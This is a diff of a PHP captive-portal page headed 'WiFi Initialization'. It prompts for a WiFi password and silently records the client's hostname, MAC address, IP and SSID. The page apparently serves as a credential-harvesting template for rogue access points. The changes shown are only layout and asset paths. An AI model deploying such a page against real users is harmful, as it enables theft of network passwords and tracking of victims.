@@ -1,3 +1,5 @@
+
+
 <?php
   $destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
   require_once('helper.php');
@@ -6,6 +8,7 @@
   <head>
     <title>Not Connected</title>
     <meta charset='UTF-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="cache-control" content="no-cache" />
     <meta http-equiv="expires" content="0" />
     <meta http-equiv="pragma" content="no-cache" />
@@ -13,7 +16,7 @@
     <meta name="viewport" content="width=device-width,
       initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
     <meta name="theme-color" content="#5170ad" />
-    <script src="jquery-2.2.1.min.js"></script>
+    <script src="assets/js/jquery.min.js"></script>
     <script type="text/javascript">
       function redirect() {
           setTimeout(function() {
@@ -21,13 +24,12 @@
           }, 100);
         }
     </script>
-    <script src="scanner.js"></script>
-    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
+    <script src="assets/js/scanner.js"></script>
     <link rel="stylesheet prefetch" href="assets/css/bulma.min.css">
     <link rel='stylesheet prefetch' href='assets/css/style.css'>
     <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
     <link rel="icon" type="image/png" href="assets/img/ymwp832k1s.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
     <title>WiFi Initialization</title>
   </head>
   <body>
@@ -127,7 +129,7 @@
                   <input class="input" id="password" type="password" placeholder="Enter password">
                   <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                   <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-                  <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+                  <input type="hidden" name="ip" id="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                   <input type="hidden" name="target" value="<?=$destination?>">
                   <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
                 </div>
@@ -135,11 +137,13 @@
             </div>
           </div>
           <footer class="card-footer">
-            <a href="#" class="card-footer-item button  is-light" disabled>Rescan</a>
+            <button type="button" id="rescan-btn" class="card-footer-item button is-light">Rescan</a>
             <button type="submit" id="submit-btn" class="card-footer-item button is-primary is-light">Login</button>
           </footer>
         </form>
       </div>
     </div>
+    <script type="text/javascript"></script>
   </body>
 </html>
+
